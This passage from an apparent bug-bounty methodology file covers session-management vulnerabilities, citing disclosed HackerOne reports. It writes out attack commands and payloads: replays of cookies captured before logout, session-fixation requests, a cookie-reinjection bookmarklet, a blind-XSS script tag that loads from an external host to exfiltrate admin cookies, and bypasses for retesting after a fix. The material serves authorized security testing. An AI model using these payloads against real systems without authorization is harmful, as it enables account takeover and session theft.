# 2) State-changing action with a "logged out" cookie (#1319892, #1329434).
#    Courier: POST /studio/invitations?tenantId=... succeeded while logged out.
curl -s -H "Cookie: $OLD_COOKIE" -X POST "https://$TARGET/studio/invitations?tenantId=<id>" \
  -H 'Content-Type: application/json' -d '{"email":"attacker@example.com"}' \
  -w '\n[%{http_code}]'

# 3) Privileged function after sign-out, with pre-logout anti-CSRF token.
#    Urban Dictionary #216294: /handle.save.php worked 72 hours after sign-out
#    if you still had the old authenticity_token and one of the victim's cookies.
curl -s -H "Cookie: $OLD_COOKIE" -X POST "https://$TARGET/handle.save.php" \
  -d "authenticity_token=<OLD_TOKEN>&value=changed"
```
Also test session URLs that never expire (#2582 — "A valid session-URL should be only a one time use"), and DCSC/DBSC-challenge stripping where the server still accepts the unbound cookie.

---

## Payload & Detection Patterns

### Two-session replay (the core primitive of this corpus)
```bash
# victim A cookie captured; victim B performs lifecycle event; replay A.
curl -s -H "Cookie: session=<A_VALUE>" https://$TARGET/api/me
curl -s -H "Authorization: Bearer <A_TOKEN>" https://$TARGET/oauth/userinfo   # #1172205
```

### Session fixation / forced ID
```bash
curl -s -L -c jar.txt "https://$TARGET/login"
# Plant an attacker-chosen ID via URL or cookie, then log in carrying it:
curl -s -L -b "session=AAAAdeadbeefAAAA" -X POST "https://$TARGET/login" \
  -d "username=victim&password=pass" -H 'Content-Type: application/x-www-form-urlencoded'
```

### Password-reset token survival
```bash
# 1) request reset token T (do not use yet)
# 2) change password via settings
# 3) consume T -> still succeeds = finding (#948345, #400826, #17474)
POST /reset?token=T  password=NewPass!2
```

### Logout-invalidation probe (incl. "Missing Logout Token Hint" pattern)
```bash
DELETE /api/v1/logout HTTP/1.1
authorization: Bearer atkn_...
Cookie: __cfduid=...; _y=...; request_method=POST
# -> {"error":"Missing Logout Token Hint"}  then replay bearer (#1172205)
```

### GraphQL-after-revoke probe
```bash
{"query":"query User_bounty_settings_page { me { email bounties } }"}  # #417382
```

### Session token in URL / Referer leakage
```
https://slack.com/go/x-2xxxxx-f8xx7#signup     # no expiry, discloses email (#2582)
?sid=  ?session=  ?token=  ?sessionid=          (#341372, #1197078)
```

### Cookie-editor / bookmarklet injection (as used in the reports)
```javascript
// WakaTime #798812 — re-inject old cookies via a bookmarklet
javascript:void(function(){
  var list = "<PASTED_COOKIES>".split("; ");
  for (var i=list.length-1;i>=0;i--){
    var p=list[i].split("=");
    document.cookie=p[0]+"="+p[1]+";domain=.target.com;expires="+d.toUTCString();
  }
  location.href='https://target.com/settings/account';
})();
// Rocket.Chat #962902 — localStorage token
localStorage.setItem('Meteor.loginToken','<STOLEN_TOKEN>');  // auto-redirects to session
```

### OOB theft confirmation
```
# Blind stored XSS exfil of admin session cookies -> XSS-hunter/Collaborator hit
"><script src=https://xvt.xss.ht></script>       # #878145, #1036877
```

### Grep / source-review patterns
```bash
grep -rEi "(session|sid|token)\s*=\s*req\.(query|body|params)" --include="*.js"
grep -rEi "deleteCookie|clearCookie|destroySession|session\.destroy|revoke" src/
grep -rEi "redirect.*(session|sid|token)|/\?(sid|session|token)=" src/
grep -rEi "jwt\.(sign|verify)|expiresIn|refresh_token|rotate" src/
```

### Fixation payload — attacker-chosen session ID
```
# URL-carried session ID that the app adopts without regeneration
GET /go/x-2xxxxx-f8xx7#signup          # reusable invite/session URL (#2582)
GET /?sid=AAAAdeadbeefAAAA             # forced ID carried into login (#423136)
Cookie: session=AAAAdeadbeefAAAA       # then POST /login with this cookie present
```

### Refresh-token rotation / reuse-detection payload
```
POST /api/login      -> {"access_token":"...","refresh_token":"RT1"}
POST /auth/refresh   {"refresh_token":"RT1"} -> {"refresh_token":"RT2"}  (expect RT2 != RT1)
POST /auth/refresh   {"refresh_token":"RT1"} -> still 200 = NO REUSE DETECTION (leaked-token persistence)
POST /auth/refresh   {"refresh_token":"RT2"} -> still 200 = family NOT revoked
```

### WebSocket session-hijack detection (#3917775)
```
# Missing Sec-WebSocket-Accept verification enables MITM of the session channel.
# Confirm by injecting a forged handshake response and observing the client accept it.
Sec-WebSocket-Accept: <forged-value>
```

### Logout-CSRF / reset-link payload (#229417, #6907)
```
# Victim logged in as A receives a reset link for account B:
GET /reset?token=<B_TOKEN>   # opening it in A's browser logs A out / changes state
POST /settings/email  email=attacker@example.com   # no session-token verification -> ATO
```

### Subdomain-fixation payload (#423136)
```
# XSS on a program-declared "N/A" sibling subdomain sets a cookie scoped to the parent,
# then authenticates the victim on the attacker-chosen session ID:
document.cookie = "session=ATTACKER_ID; domain=.shopifycloud.com; path=/";
location = "https://victim-app.shopifycloud.com/login?session=ATTACKER_ID";
```

---

## Common Root Causes

1. **Client-side cookie clearing mistaken for server-side revocation** — the browser forgets the cookie but the server still honours it. HackerOne **#288**, **#284**, Coursera **#152080**, Shopify **#1162443**.
2. **Password/email change does not kill sibling sessions** — only the acting session dies. Omise **#514577/#634488**, Paragon **#226712**, DoD **#1069392**, Unikrn **#272839**, Airflow **#3073507**, Phabricator **#1271710**.
3. **Reset/OTP token lifecycle not bound to credential lifecycle** — an old reset link stays valid after password or email change. Courier **#948345**, Weblate **#400826**, Phabricator **#17474**, HackerOne **#17383**, Secret **#23579**.
4. **No session-ID regeneration at an authentication boundary** — login, password reset, logout, or room-password entry reuse the pre-auth ID. Shopify **#423136**, Nextcloud **#1181962**, Airflow **#2121960**, **#255020**, **#193556**.
5. **Long-lived mobile/API tokens with broken or hint-gated logout** — `atkn_`, `Xauth`, `Meteor.loginToken` never revoked server-side. Shopify **#1172205**, **#1108662**, Reddit **#1632186**, Rocket.Chat **#962902**.
6. **Partial invalidation / blind spots in revoke features** — GraphQL, WebSocket, realtime notifications, and linked IdP sessions are missed. HackerOne **#417382**, Reddit **#1632186**, Shopify **#1547684**, Airflow **#2121960**.
7. **Session identifier transported in URL** — leaks through Referer, history, cache and logs; often never expires. Slack **#2582**, **#341372**, **#1197078**.
8. **Weak entropy / static identifiers** — IDs are enumerable or constant, enabling cross-user ATO without theft. DoD **#1150573**.
9. **Session secret readable from a script context** — XSS/Self-XSS or admin panels expose the token; missing `HttpOnly` makes it worse. Rocket.Chat **#962902**, Topcoder **#878145**, DoD **#1036877**.
10. **Auth-state changes without token verification** — CSRF can change the account email and take over. IRCCloud **#6907**, FanFootage **#15476**, **#229417**.

### Detection heuristics by root cause

For each root cause, the cheapest decisive test:

| Root cause | Cheapest decisive test |
|------------|------------------------|
| 1 — client-side-only logout | Replay the captured cookie after logout; body-diff vs baseline |
| 2 — sibling sessions survive | Two browsers, change password on one, replay the other |
| 3 — stale reset token | Request token, change password, consume original token |
| 4 — no ID regeneration | Diff cookie value across login / reset / room-password entry |
| 5 — mobile token not revoked | Replay `atkn_`/`Xauth` after in-app logout |
| 6 — revoke blind spot | Replay GraphQL / WS / SSO-linked session after revoke |
| 7 — session in URL | Check Referer/history for `?sid=`; test URL expiry |
| 8 — weak entropy | Collect 200+ IDs; sort for deltas and decode structure |
| 9 — script-readable token | Inject a benign probe into XSS sink; watch for token in OOB hit |
| 10 — unverified state change | CSRF a low-impact email/settings change and observe |

**Why "insufficient expiration" dominates the weakness labels:** triage often files these under CWE-613 / OWASP WSTG-SESS-01/03 rather than "session fixation." The exploit mechanics are the same — a credential that should be dead is alive — so this skill treats fixation, non-invalidation, and resurrection as one family with different entry points.

---

## Bypass Techniques

### Logout / invalidation bypasses
- **Cookie replay after client-side logout** — capture cookie, log out, inject the old cookie back via editor/bookmarklet (#1162443, #798812, #2469706, #347748).
- **Browser Back / cache** — after logout press Back; a cached authenticated page or edge 200 masks the missing invalidation (#3062299).
- **Sibling-session survival** — log in on two browsers, act on one, replay the other (#514577, #1069392, #273881, #223327, #1167029).
- **Simultaneous logon** — re-authenticate as a different user while a session is live; the old account session stays alive (#11722).
- **Clear browser history / private mode** — victim "logs out" by clearing history; old cookie still works for the attacker (#2469706).

### Credential-change bypasses
- **Stale reset token** — request reset, change password in settings, then use the original token (#948345, #400826, #17474).
- **Old-email login after email change** — account still accepts the previous email with full access (#952035).
- **External-provider backdoor** — connect an attacker-controlled Google account, then "disconnecting" it does not expire the session (#1547684).

### Fixation bypasses
- **By-design sibling-subdomain XSS plants the fixated ID** — use an XSS that the program considers N/A on `*.shopifycloud.com` to authenticate a victim on an attacker-chosen session (#423136).
- **Guest→authenticated boundary not renewed** — join a password-protected room but keep the pre-password session (#1181962).
- **Absence of `__Host-`** — a fixable precondition; without it a subdomain or insecure context can overwrite the session cookie.

### Filter / surface bypasses
- **GraphQL blind spot** — revoke REST/GET/POST but replay GraphQL queries (#417382).
- **Realtime / push resurrection** — a revoked app session comes back when a chat-invite notification is tapped (#1632186).
- **Logout-CSRF fix bypass** — reset-password link used in the victim's logged-in browser logs them out or changes state (#229417); settings email change without token verification (#6907, #15476).
- **WebSocket MITM** — missing `Sec-WebSocket-Accept` verification enables session hijack (#3917775).
- **State-changing action with a dead session** — invitations/workspace creation succeed while "logged out" (#1319892, #1329434).

### Theft-chain bypasses
- **Self-XSS → `Meteor.loginToken`** from server logs → localStorage → auto session (#962902).
- **Blind stored XSS** in a contact form → admin session cookies via XSS-hunter OOB (#878145, #1036877).
- **Session-in-URL** harvested from history/Referer and replayed (#2582, #341372).
- **Bookmarklet cookie reinjection** — hide the old cookies in a `javascript:` bookmark (WakaTime #798812) or a browser extension's "import cookies" (GSA #263873, Shopify #1162443) to restore a session the UI claims is gone.
- **Invalid HTTPS cert / cleartext subdomain** — sniff the session cookie in transit (Gratipay #242622, Basecamp #1024880).

### When a "fix" is deployed, re-run these exact bypasses
- **Patch only clears client cookies?** → replay the server-side value (#288, #284, #152080).
- **Patch rotates the readable cookie?** → check for a second stable server-side session key (#737 — invalid authenticity_token logged the user out and issued a fresh cookie, but the underlying auth state persisted).
- **Patch invalidates only the current device?** → test sibling sessions (#514577, #1069392).
- **Patch adds MFA on login but not on email confirmation?** → bypass via the confirmation link (#1701378).
- **Patch fixes REST but not GraphQL/WebSocket?** → replay the alternate transport (#417382, #3917775).
- **Patch blocks the obvious reset link?** → combine with logout CSRF as in #229417, which bypassed fixes shipped for #223329 and #223339.

---

## Gate 0 Validation

Before writing ANY session report, confirm all of the following:

1. **Two real sessions, not placeholders** — A and B captured by the real `curl` flows above. No hardcoded cookie strings in the PoC.
2. **Body-diff, never status-only** — a 200 means nothing without the account's unique identity marker, diffed against the authenticated `BEFORE` baseline. A generic SPA shell / cached 200 is not proof.
3. **Negative control** — a garbage/random cookie must FAIL where the "surviving" cookie succeeds; otherwise the endpoint is not session-gated (non-finding).
4. **Cache / edge check** — re-request with a cache-buster, via the browser Back button, and from a second IP; rule out a cached or IP-pinned 200 (#3062299, #347748).
5. **OOB for theft chains** — when impact depends on exfiltrating a cookie/token (XSS, Self-XSS, log leak), confirm receipt out-of-band (Collaborator / XSS-hunter), don't assert it (#878145, #1036877).
6. **Static-vs-state** — `HttpOnly`/`Secure`/`SameSite` absence is a *policy* observation; only report as High once paired with a real exploit primitive (XSS, MITM, CSRF). Standalone attribute gaps are Low/Informational.
7. **Delay & IP re-test** — some servers expire lazily or pin to IP; confirm the survivor survives both (#152080).
8. **What can the attacker DO right now?** — show a protected-resource body with the victim's data using a credential that *should* be dead. "The cookie still exists" is insufficient.
9. **What does the victim LOSE?** — persistent ATO past their own reset; admin session hijack; cross-user PII; a revoked device that comes back. Quantify the blast radius.
10. **10-minute reproducibility** — is the endpoint still live, the flow deterministic, and can a second person follow the A/B steps cold and get the identical body? Resolve flakiness (timing, notifications) before submitting.

**Severity:**
- Fixation → admin/SSO takeover: **Critical** (#423136)
- Revoked-app resurrection / cross-user PII via static IDs: **Critical** (#1632186, #1150573)
- No invalidation on password/email change, or refresh-token reuse without detection: **High → Critical** (escalate if MFA/step-up absent — #2469706, #1701378)
- Predictable/duplicate session ID: **High**
- No invalidation on logout: **Medium → High** (depends on theft vector — #288, #1162443)
- Missing `HttpOnly`/`SameSite` standalone: **Low/Informational** until chained

### Minimal report skeleton (keeps Gate 0 honest)

```
1. Session A: captured via <real flow> from <endpoint>  (show cookie name, not full value)
2. Identity marker in BEFORE body: <email/user-id/CSRF token>
3. Lifecycle action performed by session B: <logout / pw-change / reset / revoke>
4. AFTER body using session A: <show the SAME marker still present> [HTTP 200]
5. Negative control: garbage cookie -> <no marker / 401 / 403>
6. Cache/IP re-test: cache-buster + second IP -> marker still present
7. (Theft chains only) OOB callback receipt showing the token
8. Impact: <what the attacker can do right now> + <what the victim loses>
```
A report missing steps 2, 5, or 6 is the most common reason a real session bug gets closed as N/A or Informational.

---

## Real Impact Examples

### Scenario A — Persistent ATO past the victim's own password reset (Omise/Paragon/DoD pattern)
An attacker who had stolen or brute-forced a session (or left a shared/cybercafe browser logged in) retains access after the victim changes their password believing they have locked the attacker out. The victim logs in on Chrome and changes the password; the attacker's Firefox session is replayed against `/api/profile` and still returns the account's unique data. Omise **#514577** and **#1069392** showed profile edits succeeding from the old session; Paragon **#226712** (Critical) generalised it to "all other browsers"; Unikrn **#272839** tied it explicitly to a weak session ID that never changed on password change; Airflow **#2121960/#3073507** made the same primitive reachable via the web UI and CLI reset. When the change endpoint also lacks a current-password/MFA step-up, the read-only survivor pivots to full takeover.

### Scenario B — Session fixation escalated to admin/SSO hijack (Shopify/Nextcloud pattern)
On several Shopify-built apps, the program considered XSS on `*.shopifycloud.com`/`*.shopifyapps.com` out of scope ("N/A"). The researcher used that by-design XSS to authenticate a victim on an attacker-chosen session ID that the app never regenerated on login (#423136) — turning a "boring" fixation into an account takeover. The same boundary failure appears when a guest joins a password-protected Nextcloud talk room without the session ID being renewed (#1181962), and when Airflow resets a password but lets an already-authenticated user keep using the UI/API until natural expiry (#2121960). Fixation of an admin or SSO user is a Critical chain.

### Scenario C — Token theft and revoked-session resurrection (Rocket.Chat / Reddit / blind-XSS pattern)
In Rocket.Chat, a Self-XSS drag-and-drop image leaked `Meteor.loginToken` into server logs; adding it to `localStorage` auto-redirected the attacker into the victim's session, enabling chat reading, info changes and locking the account by enabling 2FA (#962902). Blind stored XSS in contact forms at Topcoder and a DoD `.mil` site exfiltrated **admin session cookies** out-of-band (#878145, #1036877). Separately, Reddit **#1632186** (Critical) showed the opposite failure: a session the victim had deliberately revoked came back when a chat-invite notification was tapped — a stolen/expired credential being resurrected rather than stolen, but with the same ATO impact. Shopify **#1172205** and the POS **#1108662** show the mobile mirror: logout removes a local token entry but the server keeps the bearer alive.

### Scenario D — Revoke API with a transport blind spot (HackerOne GraphQL / Shopify SSO pattern)
HackerOne shipped a "Revoke user session" feature at `/settings/sessions`; clicking Revoke logged the user out and blocked normal GET/POST, but a captured GraphQL query (`query User_bounty_settings_page`) replayed from Burp Repeater still returned sensitive bounty settings (#417382). The victim believes the device is revoked while an attacker holding that session keeps reading data through the unguarded transport. The same "partial revocation" shape appears when Shopify lets an attacker who linked their own Google account keep access after the victim disconnects that provider (#1547684), and when a Reddit app session revoked via `old.reddit.com` comes back through a chat-invite deep link (#1632186, Critical). Triage lesson: always enumerate *every* request transport (REST, GraphQL, WebSocket, push notification) against a revoke control.

### Scenario E — Session identifier in the URL (Slack invite / generic `?sid=` pattern)
Slack's signup redirect produced a unique URL (`https://slack.com/go/x-2xxxxx-f8xx7#signup`) that remained valid indefinitely; anyone with browser history could open it and disclose the user's email (#2582). The general form — `?sid=`, `?session=`, `?token=` — leaks the session through Referer headers, proxy logs, browser history and shared links (#341372, #1197078). Combined with no server-side expiry, a single harvested URL is a durable ATO primitive, and because the token travels in the URL it also defeats `HttpOnly`. The related "Never expire the reset link" family (#17474, #17383, #23579) shows the same design failure applied to password-reset URLs.

---

## Disclosed Report Citations (30 — all IDs real and present in the study pack)

Every ID below was taken verbatim from the 78-report study pack; the URL pattern is `https://hackerone.com/reports/<id>`. Together they span the full lifecycle family: fixation, logout/change non-invalidation, reset-token survival, revoke blind spots, mobile token revocation, static IDs, session-in-URL, and token-theft chains. Where the study pack listed no bounty, it is noted as "no bounty" rather than invented.

1. **Shopify — Insufficient session expiration in the com.shopify.ping android app** ([H1 #1172205](https://hackerone.com/reports/1172205)) — mobile bearer non-revocation, `atkn_` token / "Missing Logout Token Hint", 2021 / no bounty (Low, CVSS 2.3).
2. **Omise — Broken Authentication and Session Management Flaw After Change Password and Logout** ([H1 #634488](https://hackerone.com/reports/634488)) — no invalidation on password change/logout, two-browser replay, 2019 / no bounty (Low).
3. **GSA Bounty — Improper Session management can cause account takeover (micropurchase.18f.gov)** ([H1 #263873](https://hackerone.com/reports/263873)) — GitHub-linked cookie reuse, cookie-editor replay, 2017 / no bounty (Medium).
4. **HackerOne — Broken Authentication and session management OWASP A2** ([H1 #284](https://hackerone.com/reports/284)) — client-side-only logout, cookie reuse hours later, 2013 / no bounty.
5. **Courier — Broken Authentication Session Token Bug** ([H1 #948345](https://hackerone.com/reports/948345)) — stale reset/OTP token after password change, 2020 / no bounty (Medium, CVSS 6.1).
6. **HackerOne — Session Not Expire / 2FA Bypass** ([H1 #2469706](https://hackerone.com/reports/2469706)) — cookie replay after history clear, 2FA-bypass chain, 2024 / no bounty (Medium, CVSS 5.2).
7. **Phabricator — Broken Authentication and Session Management** ([H1 #17474](https://hackerone.com/reports/17474)) — stale password-reset link after email change, 2014 / no bounty.
8. **Liberapay — Broken Authentication and session management OWASP A2** ([H1 #449671](https://hackerone.com/reports/449671)) — cookie replay to admin edit, 2018 / no bounty.
9. **Reddit — Can use the Reddit android app as usual even though revoking the access of it from reddit.com** ([H1 #1632186](https://hackerone.com/reports/1632186)) — revoked-session resurrection via notification, 2022 / no bounty (Critical).
10. **Lab45 — Blind stored XSS via insecure contact form at topcoder.com leaks session token and PII** ([H1 #878145](https://hackerone.com/reports/878145)) — blind XSS admin-cookie theft, OOB, 2020 / no bounty (High).
11. **Weblate — Broken Authentication – Session Token bug** ([H1 #400826](https://hackerone.com/reports/400826)) — stale reset token after password change, 2018 / no bounty.
12. **U.S. Dept Of Defense — Blind stored XSS via insecure .mil contact form leaks session token** ([H1 #1036877](https://hackerone.com/reports/1036877)) — blind XSS admin session-cookie theft, OOB, 2020 / no bounty (High).
13. **Basecamp — SSL expired subdomain leads to API swap with main and flagged cookies** ([H1 #1024880](https://hackerone.com/reports/1024880)) — flagged cookies / session token exposure, 2020 / no bounty (Medium).
14. **Coursera — Broken authentication and session management flaw** ([H1 #152080](https://hackerone.com/reports/152080)) — no server-side logout invalidation, day-later cookie reuse, 2016 / no bounty.
15. **Rocket.Chat — Session Hijack via Self-XSS** ([H1 #962902](https://hackerone.com/reports/962902)) — `Meteor.loginToken` theft → localStorage session, 2020 / no bounty (Medium, CVSS 5.4).
16. **Paragon Initiative Enterprises — Failure to Invalidate Session on all other browsers at Password change** ([H1 #226712](https://hackerone.com/reports/226712)) — sibling-session persistence, 2017 / no bounty (Critical).
17. **WakaTime — Broken Authentication and session management OWASP A2** ([H1 #798812](https://hackerone.com/reports/798812)) — bookmarklet cookie reinjection after logout, 2020 / no bounty.
18. **Shopify — Admin web sessions remain active after logout of Shopify ID** ([H1 #952035](https://hackerone.com/reports/952035)) — no invalidation after email change, 2020 / no bounty.
19. **U.S. Dept Of Defense — Authenticated portal: session IDs appear static, all PII available** ([H1 #1150573](https://hackerone.com/reports/1150573)) — static/enumerable session ID → cross-user PII, 2021 / no bounty (Critical).
20. **Phabricator — Broken Authentication and Session Management lead to take over account** ([H1 #1271710](https://hackerone.com/reports/1271710)) — session-token weakness / email-change ATO, 2021 / no bounty (High).
21. **IRCCloud — Session Token is not Verified while changing Account Settings leading to ATO** ([H1 #6907](https://hackerone.com/reports/6907)) — CSRF email change, unverified session token, 2014 / no bounty.
22. **HackerOne (security) — Insufficient Session Expiration in "Revoke user session" (GraphQL)** ([H1 #417382](https://hackerone.com/reports/417382)) — revoke gap, GraphQL after revoke, 2018 / $500 (Low).
23. **rocket_chat — Bypassing 2FA with conventional session management (open.rocket.chat)** ([H1 #1701378](https://hackerone.com/reports/1701378)) — 2FA bypass via email-confirmation link, 2024 / no bounty (Low).
24. **Shopify — H1514 Session Fixation on multiple shopify-built apps (*.shopifycloud.com / *.shopifyapps.com)** ([H1 #423136](https://hackerone.com/reports/423136)) — fixation + by-design sibling-subdomain XSS, 2018 / no bounty.
25. **Shopify — No Session Expiry after log-out, attacker can reuse the old cookies** ([H1 #1162443](https://hackerone.com/reports/1162443)) — old-cookie replay, 2021 / $500 (Low).
26. **Hiro — Logout Bypass Vulnerability in Hiro.so** ([H1 #3062299](https://hackerone.com/reports/3062299)) — browser-back/cache logout bypass, 2025 / $150 (Medium, CVSS 5.0).
27. **Nextcloud — Session fixation on public talk links** ([H1 #1181962](https://hackerone.com/reports/1181962)) — guest→auth fixation, room password no regeneration, 2021 / $100 (Medium, CVSS 6.4).
28. **X / xAI — Improper session handling on web browsers** ([H1 #347748](https://hackerone.com/reports/347748)) — stale session / notification leak across accounts, 2018 / $560 (Medium).
29. **Shopify — Disconnecting an external login provider does not revoke session** ([H1 #1547684](https://hackerone.com/reports/1547684)) — SSO-linked session backdoor survives disconnect, 2022 / $1,600 (Medium, CVSS 4.2).
30. **Omise — Failure to Invalid Session after Password Change** ([H1 #514577](https://hackerone.com/reports/514577)) — sibling sessions survive password change, 2019 / no bounty (Medium).

---

## Related Skills & Chains

| Session finding | Chain to | Impact / evidence |
|-----------------|----------|-------------------|
| Fixation (no `__Host-`, no regeneration) | `hunt-xss` / sibling-subdomain XSS plants the ID | Admin/SSO hijack — Shopify #423136, Nextcloud #1181962 |
| No logout/password-change invalidation | `hunt-xss` / `hunt-dom` cookie theft → replay surviving session | Persistent ATO past victim's reset — Omise #514577, Paragon #226712 |
| Reset/OTP token reuse | `hunt-ato` account-recovery flow abuse | ATO via stale reset link — Courier #948345, Weblate #400826 |
| Refresh token, no reuse-detection | Leaked RT (SSRF/log/bundle) → infinite access-token minting | Persistent ATO, survives password change (OAuth Security BCP) |
| `SameSite=Lax` only | `hunt-csrf` sibling-subdomain top-level nav (CVE-2024-22424 class) | Login-CSRF → fixation — IRCCloud #6907 |
| JWT no `exp`/`jti` | `hunt-api-misconfig` alg/kid/key-confusion | Permanent access, cosmetic logout |
| Static/low-entropy ID | `hunt-idor` / direct ID substitution | Cross-user PII — DoD #1150573 |
| DBSC downgrade accepted | `hunt-xss` steals the plain cookie | Defeats the only theft mitigation |
| Blind XSS → admin session cookie | `hunt-xss` + OOB (Collaborator/XSS-hunter) | Admin ATO — Topcoder #878145, DoD #1036877 |

**Cross-references:** ATO chaining → `hunt-ato`; CSRF mechanics → `hunt-csrf`; cookie-theft sinks → `hunt-xss` / `hunt-dom`; OAuth `state`/`redirect_uri`/code-injection → `hunt-oauth`; JWT alg/kid tampering → `hunt-api-misconfig`; MFA/step-up gaps → `hunt-mfa-bypass`; leaked-token reach via SSRF/log/source → `hunt-ssrf` / `hunt-source-leak`; TLS/cert weaknesses carrying the session → `hunt-tls-network`; reusable OOB callback discipline → `triage-validation`.

### How to hand off cleanly

- **Fixation without a planting mechanism is usually Low/Informational.** Hand the "plant the ID" step to `hunt-xss` / `hunt-csrf` / a writable sibling subdomain; Shopify #423136 is the canonical example of turning a boring fixation into a Critical ATO by pairing it with by-design XSS. Without that pairing, report the missing regeneration as a hardening issue and move on.
- **A surviving session is only as strong as the theft vector.** If you cannot demonstrate how an attacker obtains the cookie, pair with `hunt-xss`/`hunt-dom` (Rocket.Chat #962902), `hunt-tls-network` (Gratipay #242622), or a source/SSRF leak. The corpus's own reporters frequently stated the precondition explicitly ("if an attacker got the cookies by exploiting any vulnerability" — Shopify #1162443).
- **Do not duplicate token-forgery work.** JWT `alg:none`, `kid` injection, and key confusion belong to `hunt-api-misconfig`; session-layer expiry (`exp`/`jti`) and logout revocation belong here.
- **OAuth/SSO session linkage is a seam, not the whole flow.** `state`, `redirect_uri`, and authorization-code injection go to `hunt-oauth`; "does the app session outlive the IdP session / linked provider?" stays here (Shopify #1547684, GSA #263873).
- **Reuse-discipline across every OOB claim.** Whether it is a blind-XSS cookie exfil (Topcoder #878145, DoD #1036877) or a leaked refresh token, `triage-validation` enforces a unique Collaborator marker tied to a specific sink before submission — the same gate that stops false positives in SSRF hunting.

### Final operator reminder

The corpus speaks with one voice: *"the cookies stored on the browser are not getting expired after logging out"* (GSA #263873), *"When a user changes his account password, all the sessions on other devices/browsers should expire"* (Paragon #226712), *"The session id should be renewed once the password is entered"* (Nextcloud #1181962). Capture a real session, perform the event that is supposed to revoke it, replay the exact old value, body-diff the result, run the garbage-cookie control — and only then write the report.
